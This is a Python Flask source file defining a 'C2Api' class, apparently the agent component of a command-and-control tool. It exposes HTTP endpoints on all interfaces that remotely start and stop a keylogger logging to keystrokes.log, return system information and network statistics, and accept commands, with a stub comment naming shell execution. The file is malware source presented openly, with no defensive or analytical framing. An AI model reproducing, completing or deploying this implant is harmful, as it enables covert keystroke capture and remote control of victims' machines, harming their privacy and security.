from flask import Flask, request, jsonify
import logging
from system_information import SystemInformation
from network_statistics import NetworkStatistics
from key_logger import KeyLogger
import dataclasses

class C2Api:
    def __init__(self):
        self.app = Flask(__name__)
        self.setup_routes()
        self.keylogger = KeyLogger("keystrokes.log")
        self.logger = logging.getLogger(__name__)

    def setup_routes(self):
        @self.app.route('/command', methods=['POST'])
        def command():
            data = request.json
            self.logger.info(f"Received command: {data}")
            # Process the command
            # Example: execute a shell command, start/stop keylogger, etc.
            return jsonify({"status": "Command received"}), 200

        @self.app.route('/info', methods=['GET'])
        def info():
            self.logger.info("Request for system information received")
            system_info = SystemInformation()
            system_info.gather_information()
            return jsonify(dataclasses.asdict(system_info)), 200

        @self.app.route('/network', methods=['GET'])
        def network():
            self.logger.info("Request for network statistics received")
            net_stats = NetworkStatistics()
            net_stats.gather_network_stats()
            return jsonify(dataclasses.asdict(net_stats)), 200

        @self.app.route('/keylog/start', methods=['POST'])
        def start_keylog():
            self.logger.info("Starting keylogger")
            self.keylogger.start()
            return jsonify({"status": "Keylogger started"}), 200

        @self.app.route('/keylog/stop', methods=['POST'])
        def stop_keylog():
            self.logger.info("Stopping keylogger")
            self.keylogger.stop()
            return jsonify({"status": "Keylogger stopped"}), 200

        @self.app.route("/hearbeat", methods=["GET"])
        def heartbeat():
            self.logger.info("Hearbeat request received")
            return jsonify({"status": "alive"}), 200

    def run(self, host='0.0.0.0', port=5000):
        self.logger.info("Starting API server")
        self.app.run(host=host, port=port)

# Example of using logging in api.py
logger = logging.getLogger(__name__)
logger.info("API module loaded")
